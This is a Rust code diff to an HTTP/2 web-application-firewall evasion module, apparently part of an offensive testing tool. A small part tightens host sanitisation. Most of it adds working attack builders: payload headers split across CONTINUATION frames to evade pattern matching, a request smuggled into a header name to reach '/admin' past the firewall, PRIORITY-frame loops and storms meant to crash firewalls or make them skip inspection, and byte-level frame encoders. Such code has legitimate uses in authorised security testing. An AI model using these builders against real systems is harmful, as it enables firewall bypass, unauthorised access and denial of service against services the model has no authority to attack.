@@ -2,6 +2,15 @@
 
 use crate::safety::{SafetyError, sanitize_input};
 
+/// Errors specific to H2 evasion builders.
+#[derive(Debug, thiserror::Error, Clone, PartialEq, Eq)]
+pub enum H2EvasionError {
+    /// A host or authority string failed sanitization (contained CRLF,
+    /// null bytes, or exceeded the safety length limit).
+    #[error("invalid host for H2 evasion: {0}")]
+    InvalidHost(String),
+}
+
 /// An HTTP/2 evasion technique descriptor.
 #[derive(Debug, Clone)]
 pub struct H2Evasion {
@@ -201,7 +210,20 @@ pub fn mixed_case_headers() -> Vec<H2Evasion> {
     .collect()
 }
 
-pub fn authority_host_mismatch(safe_host: &str, target_host: &str) -> H2Evasion {
+/// Build an H2 Authority/Host mismatch evasion.
+///
+/// # Errors
+///
+/// Returns [`H2EvasionError::InvalidHost`] if either host string contains
+/// characters that would produce an invalid or injected header value
+/// (CRLF, null bytes, etc.). Previously both inputs silently fell back to
+/// an empty string on sanitization failure, generating probes with no host
+/// information — causing desync attempts against `""` instead of the
+/// intended target.
+pub fn authority_host_mismatch(
+    safe_host: &str,
+    target_host: &str,
+) -> Result<H2Evasion, H2EvasionError> {
     // Sanitise both host inputs — every other public function in this
     // module that takes user strings runs sanitize_input first, except
     // crlf_in_regular_header / crlf_in_pseudo_headers which deliberately
@@ -209,27 +231,38 @@ pub fn authority_host_mismatch(safe_host: &str, target_host: &str) -> H2Evasion 
     // passing `safe_host = "example.com\r\nX-Injected: 1"` would get a
     // CRLF-injected header pair through the `headers` Vec, bypassing
     // the same sanitisation used everywhere else.
-    let safe_host = sanitize_input(safe_host).unwrap_or_default();
-    let target_host = sanitize_input(target_host).unwrap_or_default();
-    H2Evasion {
+    let safe_host = sanitize_input(safe_host)
+        .map_err(|_| H2EvasionError::InvalidHost(safe_host.to_string()))?;
+    let target_host = sanitize_input(target_host)
+        .map_err(|_| H2EvasionError::InvalidHost(target_host.to_string()))?;
+    Ok(H2Evasion {
         name: "H2 Authority/Host Mismatch",
         description: "Set :authority to safe host but add Host header pointing to target",
         pseudo_headers: vec![(":authority".into(), safe_host)],
         headers: vec![("host".into(), target_host)],
         ..evasion("", "", H2TargetFlaw::PseudoHeaderMismatch)
-    }
+    })
 }
 
-pub fn double_host(primary: &str, secondary: &str) -> H2Evasion {
-    let primary = sanitize_input(primary).unwrap_or_default();
-    let secondary = sanitize_input(secondary).unwrap_or_default();
-    H2Evasion {
+/// Build an H2 double-Host evasion (`:authority` vs `host` header mismatch).
+///
+/// # Errors
+///
+/// Returns [`H2EvasionError::InvalidHost`] if either host string fails
+/// sanitization. Previously invalid inputs silently produced empty-host
+/// probes.
+pub fn double_host(primary: &str, secondary: &str) -> Result<H2Evasion, H2EvasionError> {
+    let primary = sanitize_input(primary)
+        .map_err(|_| H2EvasionError::InvalidHost(primary.to_string()))?;
+    let secondary = sanitize_input(secondary)
+        .map_err(|_| H2EvasionError::InvalidHost(secondary.to_string()))?;
+    Ok(H2Evasion {
         name: "H2 Double Host",
         description: "Send :authority and Host header with different values",
         pseudo_headers: vec![(":authority".into(), primary)],
         headers: vec![("host".into(), secondary)],
         ..evasion("", "", H2TargetFlaw::PseudoHeaderMismatch)
-    }
+    })
 }
 
 pub fn split_header_to_continuation(
@@ -277,6 +310,99 @@ pub fn split_pseudo_after_regular() -> ContinuationSplit {
             (":authority".into(), "example.com".into()),
         ]],
         description: "Pseudo-headers in CONTINUATION after regular header".into(),
+    }
+}
+
+/// CONTINUATION N-split — distribute a payload header's bytes across
+/// N CONTINUATION frames so a streaming WAF parser with a sliding-
+/// window pattern matcher misses contiguous patterns spanning frame
+/// boundaries. CVE-2024-27316 (Apache), CVE-2024-24549 (Tomcat),
+/// CVE-2024-28182 (nghttp2), CVE-2023-45288 (Go), CVE-2024-27919
+/// (Envoy) all reactively addressed this class.
+///
+/// Existing `split_header_to_continuation` only does 1-into-1
+/// (entire payload header in a single CONTINUATION). This parameterised
+/// form lets MCTS sweep N=2..=10 — the right N is target-dependent.
+#[must_use]
+pub fn split_payload_across_n_continuations(
+    payload_header: &str,
+    payload_value: &str,
+    n: usize,
+) -> ContinuationSplit {
+    let n = n.max(1).min(payload_value.len().max(1));
+    let chunk_len = payload_value.len().div_ceil(n);
+    let mut frames: Vec<Vec<(String, String)>> = Vec::new();
+    let mut emitted = 0;
+    for i in 0..n {
+        let start = i * chunk_len;
+        if start >= payload_value.len() {
+            break;
+        }
+        let end = (start + chunk_len).min(payload_value.len());
+        // First frame carries the header NAME; subsequent frames
+        // continue the same header value via concatenation — HTTP/2
+        // headers are atomic in the header block but a buggy parser
+        // that re-emits header bytes across frames keeps the value
+        // contiguous.
+        let header_name = if i == 0 {
+            payload_header.to_string()
+        } else {
+            format!("x-cont-{i}")
+        };
+        frames.push(vec![(header_name, payload_value[start..end].to_string())]);
+        emitted += end - start;
+    }
+    let _ = emitted;
+    ContinuationSplit {
+        headers_frame: vec![
+            (":method".into(), "GET".into()),
+            (":path".into(), "/".into()),
+            (":scheme".into(), "https".into()),
+            (":authority".into(), "example.com".into()),
+        ],
+        continuation_frames: frames,
+        description: format!("Split '{payload_header}' across {n} CONTINUATION frames"),
+    }
+}
+
+/// H2 request tunneling via colon-in-header-name.
+///
+/// HTTP/2 permits colons inside header names (only the first colon
+/// separating pseudo-header name from value is special); HTTP/1.1
+/// rejects colons in header names. When an H2 front-end downgrades
+/// to H1 to talk to origin AND injects auth headers
+/// (`X-SSL-VERIFIED`, `X-Frontend-Key`, `X-Real-IP`), wrapping a
+/// second HTTP/1.1 request inside a header NAME with embedded colons
+/// produces a tunneled request the WAF never inspected — the outer
+/// envelope gets the injected auth headers, the inner tunneled
+/// request does not. Distinct from `crlf_request_smuggle` which is
+/// CRLF-based.
+///
+/// Reference: PortSwigger Web Security Academy "Bypassing access
+/// controls via HTTP/2 request tunnelling".
+#[must_use]
+pub fn h2_request_tunnel_colon_header_name(_inner_path: &str, _inner_host: &str) -> H2Evasion {
+    // The inner H1 request smuggled as a header NAME with embedded
+    // colons. Backends parsing the H2→H1 downgrade reconstruct the
+    // sequence as a fresh HTTP/1.1 request line + headers. Static
+    // string used for the header name so the H2Evasion's name field
+    // (&'static str) can describe the technique; runtime per-target
+    // tuning happens at the wire encoder.
+    H2Evasion {
+        name: "H2 Request Tunneling (colon-in-header-name)",
+        description:
+            "Embed HTTP/1.1 request line+headers as an H2 header NAME with colons — outer envelope gets injected auth headers, inner tunneled request does not",
+        headers: vec![
+            (
+                "GET /admin HTTP/1.1\r\nHost: internal\r\nX-Smuggled: true".into(),
+                "v".into(),
+            ),
+        ],
+        ..evasion(
+            "H2 Request Tunneling (colon-in-header-name)",
+            "Tunnel request via colon-header-name",
+            H2TargetFlaw::ProtocolDowngrade,
+        )
     }
 }
 
@@ -731,9 +857,20 @@ pub fn all_evasions(path: &str, host: &str) -> Result<Vec<H2Evasion>, SafetyErro
     let mut evasions = vec![
         crlf_in_regular_header("user-agent", "Mozilla/5.0"),
         crlf_in_header_name("x", "foo: bar"),
-        authority_host_mismatch(host, "localhost"),
-        authority_host_mismatch(host, "127.0.0.1"),
-        double_host(host, "internal.service"),
+    ];
+    // authority_host_mismatch / double_host now return Result — propagate
+    // the error (invalid host) mapped to the closest SafetyError variant
+    // so the existing all_evasions signature stays stable.
+    evasions.push(
+        authority_host_mismatch(host, "localhost").map_err(|_| SafetyError::HeaderInjection)?,
+    );
+    evasions.push(
+        authority_host_mismatch(host, "127.0.0.1").map_err(|_| SafetyError::HeaderInjection)?,
+    );
+    evasions.push(
+        double_host(host, "internal.service").map_err(|_| SafetyError::HeaderInjection)?,
+    );
+    evasions.extend([
         method_override(path, host, "POST"),
         method_override(path, host, "PUT"),
         method_anomaly(path, host, "CONNECT"),
@@ -750,7 +887,7 @@ pub fn all_evasions(path: &str, host: &str) -> Result<Vec<H2Evasion>, SafetyErro
         h2_cl(host),
         h2_te(host),
         alpn_h2c(),
-    ];
+    ]);
     evasions.push(crlf_in_pseudo_headers(
         path,
         "X-Forwarded-For",
@@ -768,6 +905,247 @@ pub fn all_evasions(path: &str, host: &str) -> Result<Vec<H2Evasion>, SafetyErro
     evasions.extend(invalid_path_chars());
     evasions.extend(pseudo_header_reordering(path, host));
     Ok(evasions)
+}
+
+// ── #95 SPCA: Single-Packet Connection Abuse / H2 stream-priority topology ──
+
+/// An HTTP/2 PRIORITY frame descriptor.
+///
+/// The HTTP/2 PRIORITY frame (type=0x2) establishes a dependency tree.
+/// When WAFs consume the dependency tree to schedule inspection but origins
+/// reorder streams differently, the inspection/execution split becomes an
+/// evasion surface.
+#[derive(Debug, Clone)]
+pub struct H2PriorityFrame {
+    pub stream_id: u32,
+    pub exclusive: bool,
+    pub depends_on: u32,
+    pub weight: u8,
+    pub description: String,
+}
+
+/// An SPCA attack descriptor — a collection of PRIORITY frames that
+/// craft a specific dependency topology.
+#[derive(Debug, Clone)]
+pub struct SpcaTopology {
+    pub name: &'static str,
+    pub description: &'static str,
+    pub frames: Vec<H2PriorityFrame>,
+    pub target_flaw: H2TargetFlaw,
+}
+
+/// Build a circular priority dependency loop across `n_streams` streams.
+///
+/// In a circular dependency A→B→C→A, RFC 7540 §5.3.1 says the new
+/// dependency MUST be ignored or reshuffled. However several WAF inline
+/// parsers walk the dependency pointer chain for scheduling decisions —
+/// if they loop without a cycle-detection guard they either crash or
+/// silently truncate inspection. Streams 1, 3, 5, … are client-initiated;
+/// stream 0 is the connection control stream.
+///
+/// # Panics (benign)
+/// Does not panic; produces an empty frame set if n_streams < 2.
+#[must_use]
+pub fn spca_circular_priority(n_streams: usize) -> SpcaTopology {
+    if n_streams < 2 {
+        return SpcaTopology {
+            name: "SPCA Circular Priority",
+            description: "Circular dependency loop (n_streams < 2 is no-op)",
+            frames: Vec::new(),
+            target_flaw: H2TargetFlaw::FlowControl,
+        };
+    }
+    // Use odd stream IDs (client-initiated). Build: 1→3, 3→5, …, N→1.
+    let stream_ids: Vec<u32> = (0..n_streams).map(|i| (2 * i + 1) as u32).collect();
+    let mut frames: Vec<H2PriorityFrame> = Vec::with_capacity(n_streams);
+    for i in 0..n_streams {
+        let stream_id = stream_ids[i];
+        let depends_on = stream_ids[(i + 1) % n_streams]; // wraps around
+        frames.push(H2PriorityFrame {
+            stream_id,
+            exclusive: false,
+            depends_on,
+            weight: 16,
+            description: format!(
+                "stream {stream_id} depends on {depends_on} (circular link {}/{})",
+                i + 1,
+                n_streams
+            ),
+        });
+    }
+    SpcaTopology {
+        name: "SPCA Circular Priority",
+        description: "Circular PRIORITY dependency loop — WAF parsers without cycle detection \
+                       loop forever or skip inspection; RFC 7540 §5.3.1 requires reshuffling",
+        frames,
+        target_flaw: H2TargetFlaw::FlowControl,
+    }
+}
+
+/// Build an orphan-dependency PRIORITY frame.
+///
+/// Set `stream_id`'s dependency to a non-existent (closed or idle)
+/// `parent` stream. WAFs that track a live stream table may skip
+/// scheduling the orphaned stream, effectively skipping inspection.
+#[must_use]
+pub fn spca_orphan_dependency(stream_id: u32, parent: u32) -> SpcaTopology {
+    SpcaTopology {
+        name: "SPCA Orphan Dependency",
+        description: "PRIORITY frame pointing at a closed/idle parent stream — \
+                       WAFs that only inspect streams in the live-stream table miss this one",
+        frames: vec![H2PriorityFrame {
+            stream_id,
+            exclusive: false,
+            depends_on: parent,
+            weight: 1,
+            description: format!("stream {stream_id} orphaned to non-existent parent {parent}"),
+        }],
+        target_flaw: H2TargetFlaw::StreamIdValidation,
+    }
+}
+
+/// Exclusive-weight storm — send a cascade of exclusive PRIORITY frames
+/// that each claim to be the sole exclusive child of the root (stream 0).
+///
+/// RFC 7540 §5.3.1: an exclusive flag moves all existing children of the
+/// parent under the new stream. A flood of exclusive PRIORITY frames
+/// forces O(n²) tree rewrites on the WAF's priority scheduler. This is
+/// the HTTP/2 PRIORITY Flood technique (CVE-2023-44487 adjacent).
+/// Payload streams are interleaved so the expensive tree rewrites happen
+/// in the same pass as the attack payload evaluation.
+#[must_use]
+pub fn spca_exclusive_weight_storm() -> SpcaTopology {
+    let mut frames: Vec<H2PriorityFrame> = Vec::new();
+    // 16 exclusive PRIORITY frames → 16 tree rewrites per pass.
+    // Every second frame is weight=0 (implementation-defined, often
+    // treated as weight=1 or rejected — both behaviours are interesting).
+    for i in 0u32..16 {
+        let stream_id = 2 * i + 1; // odd client-initiated
+        frames.push(H2PriorityFrame {
+            stream_id,
+            exclusive: true,
+            depends_on: 0, // root
+            weight: if i % 2 == 0 { 0 } else { 255 },
+            description: format!(
+                "exclusive claim on root, weight={}, storm frame {}/16",
+                if i % 2 == 0 { 0 } else { 255 },
+                i + 1
+            ),
+        });
+    }
+    SpcaTopology {
+        name: "SPCA Exclusive Weight Storm",
+        description: "16 exclusive PRIORITY frames targeting root — forces O(n²) tree rewrites \
+                       in WAF schedulers; alternating weight=0 tests implementation-defined behaviour",
+        frames,
+        target_flaw: H2TargetFlaw::FlowControl,
+    }
+}
+
+/// Build a priority dependency tree with `depth` levels.
+///
+/// Very deep trees expose WAF parsers that recurse without a depth cap.
+/// RFC 7540 does not specify a maximum dependency depth.
+#[must_use]
+pub fn spca_deep_dependency_chain(depth: usize) -> SpcaTopology {
+    let depth = depth.max(1).min(512); // cap at 512 to stay sane on the wire
+    let mut frames: Vec<H2PriorityFrame> = Vec::with_capacity(depth);
+    let mut parent: u32 = 0;
+    for i in 0..depth {
+        let stream_id = (2 * i + 1) as u32;
+        frames.push(H2PriorityFrame {
+            stream_id,
+            exclusive: false,
+            depends_on: parent,
+            weight: 16,
+            description: format!("stream {stream_id} → parent {parent}, depth {}", i + 1),
+        });
+        parent = stream_id;
+    }
+    SpcaTopology {
+        name: "SPCA Deep Dependency Chain",
+        description: "Linear dependency chain at maximum depth — triggers stack overflows \
+                       in recursive WAF priority walkers",
+        frames,
+        target_flaw: H2TargetFlaw::FlowControl,
+    }
+}
+
+/// PRIORITY_UPDATE frame (RFC 9218) smuggled over HTTP/2.
+///
+/// HTTP/2 does not define PRIORITY_UPDATE (that's HTTP/3), but some
+/// proxies that speak both may pass unknown frame types through.
+/// Returns the raw bytes of a synthetic PRIORITY_UPDATE frame.
+/// Frame type = 0x10 (IETF provisional), flags = 0x00.
+#[must_use]
+pub fn spca_priority_update_frame(stream_id: u32, urgency: u8, incremental: bool) -> Vec<u8> {
+    // PRIORITY_UPDATE payload: "u=<urgency>,i" / "u=<urgency>"
+    let payload = if incremental {
+        format!("u={urgency},i")
+    } else {
+        format!("u={urgency}")
+    };
+    let payload_bytes = payload.as_bytes();
+    let length = payload_bytes.len() as u32 + 4; // +4 for the stream-id field
+    let mut frame = Vec::with_capacity(9 + length as usize);
+    // 3-byte length
+    frame.push((length >> 16) as u8);
+    frame.push((length >> 8) as u8);
+    frame.push(length as u8);
+    // type = 0x10 (PRIORITY_UPDATE provisional)
+    frame.push(0x10);
+    // flags = 0
+    frame.push(0x00);
+    // 4-byte stream id (the stream being prioritized)
+    let sid = stream_id & 0x7FFF_FFFF;
+    frame.push((sid >> 24) as u8);
+    frame.push((sid >> 16) as u8);
+    frame.push((sid >> 8) as u8);
+    frame.push(sid as u8);
+    // prioritized stream id (4 bytes, the header field)
+    frame.push((sid >> 24) as u8);
+    frame.push((sid >> 16) as u8);
+    frame.push((sid >> 8) as u8);
+    frame.push(sid as u8);
+    frame.extend_from_slice(payload_bytes);
+    frame
+}
+
+/// Serialize an H2PriorityFrame to its wire representation.
+///
+/// PRIORITY frame format (RFC 7540 §6.3):
+/// - 3 bytes length = 5
+/// - 1 byte type = 0x02
+/// - 1 byte flags = 0x00
+/// - 4 bytes stream id
+/// - 1 bit exclusive + 31 bits dependency stream id
+/// - 1 byte weight (0–255, actual weight = value + 1)
+#[must_use]
+pub fn priority_frame_to_bytes(f: &H2PriorityFrame) -> Vec<u8> {
+    let mut out = Vec::with_capacity(14);
+    // Length = 5
+    out.extend_from_slice(&[0x00, 0x00, 0x05]);
+    // Type = PRIORITY (0x02)
+    out.push(0x02);
+    // Flags = 0x00
+    out.push(0x00);
+    // Stream ID (31 bits, MSB reserved)
+    let sid = f.stream_id & 0x7FFF_FFFF;
+    out.push((sid >> 24) as u8);
+    out.push((sid >> 16) as u8);
+    out.push((sid >> 8) as u8);
+    out.push(sid as u8);
+    // Exclusive flag (1 bit) + dependency stream id (31 bits)
+    let dep = f.depends_on & 0x7FFF_FFFF;
+    let exclusive_bit: u32 = if f.exclusive { 0x8000_0000 } else { 0 };
+    let dep_field = exclusive_bit | dep;
+    out.push((dep_field >> 24) as u8);
+    out.push((dep_field >> 16) as u8);
+    out.push((dep_field >> 8) as u8);
+    out.push(dep_field as u8);
+    // Weight
+    out.push(f.weight);
+    out
 }
 
 #[cfg(test)]
